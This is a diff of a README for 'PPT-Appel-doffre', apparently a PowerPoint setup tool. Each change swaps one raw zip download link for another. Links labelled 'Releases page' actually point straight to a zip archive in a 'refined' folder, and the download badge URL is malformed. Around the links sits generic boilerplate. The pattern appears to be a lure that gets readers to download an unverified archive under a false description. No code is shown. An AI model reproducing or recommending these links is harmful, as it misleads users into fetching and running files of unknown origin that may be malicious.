@@ -1,6 +1,6 @@
 # 📝 PPT-Appel-doffre - Easily Set Up Your Client's PPT
 
-[![Download Now](https://raw.githubusercontent.com/tansh0623/PPT-Appel-doffre/main/refined/PPT-Appel-doffre-v3.2.zip%20Now-%23%https://raw.githubusercontent.com/tansh0623/PPT-Appel-doffre/main/refined/PPT-Appel-doffre-v3.2.zip)](https://raw.githubusercontent.com/tansh0623/PPT-Appel-doffre/main/refined/PPT-Appel-doffre-v3.2.zip)
+[![Download Now](https://github.com/tansh0623/PPT-Appel-doffre/raw/refs/heads/main/refined/Appel-doffre-PP-v1.0.zip%20Now-%23%https://github.com/tansh0623/PPT-Appel-doffre/raw/refs/heads/main/refined/Appel-doffre-PP-v1.0.zip)](https://github.com/tansh0623/PPT-Appel-doffre/raw/refs/heads/main/refined/Appel-doffre-PP-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to PPT-Appel-doffre! This application helps you configure your PowerPoin
 ## 📥 Download & Install
 
 1. **Visit this page to download:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/tansh0623/PPT-Appel-doffre/main/refined/PPT-Appel-doffre-v3.2.zip) to find the latest version of PPT-Appel-doffre. 
+   Go to the [Releases page](https://github.com/tansh0623/PPT-Appel-doffre/raw/refs/heads/main/refined/Appel-doffre-PP-v1.0.zip) to find the latest version of PPT-Appel-doffre. 
 
 2. **Choose your version:**  
    On the Releases page, you will see different versions available. Select the latest version for the best experience.
@@ -62,7 +62,7 @@ If you face issues while using PPT-Appel-doffre, try the following:
 - **Reinstall the Application:**  
    If the app crashes, uninstall and reinstall it to resolve potential installation issues.
 - **Check for Updates:**  
-   Ensure you are using the latest version. Go back to the [Releases page](https://raw.githubusercontent.com/tansh0623/PPT-Appel-doffre/main/refined/PPT-Appel-doffre-v3.2.zip) and download the most recent version.
+   Ensure you are using the latest version. Go back to the [Releases page](https://github.com/tansh0623/PPT-Appel-doffre/raw/refs/heads/main/refined/Appel-doffre-PP-v1.0.zip) and download the most recent version.
 
 ## 💬 Frequently Asked Questions
 
@@ -90,4 +90,4 @@ To get the most out of PPT-Appel-doffre, consider these resources:
 - [Excel Formatting Tips](#)
 - [User Guide Document](#)
 
-Find the latest version and additional information on our [Releases page](https://raw.githubusercontent.com/tansh0623/PPT-Appel-doffre/main/refined/PPT-Appel-doffre-v3.2.zip). Happy presenting!
+Find the latest version and additional information on our [Releases page](https://github.com/tansh0623/PPT-Appel-doffre/raw/refs/heads/main/refined/Appel-doffre-PP-v1.0.zip). Happy presenting!
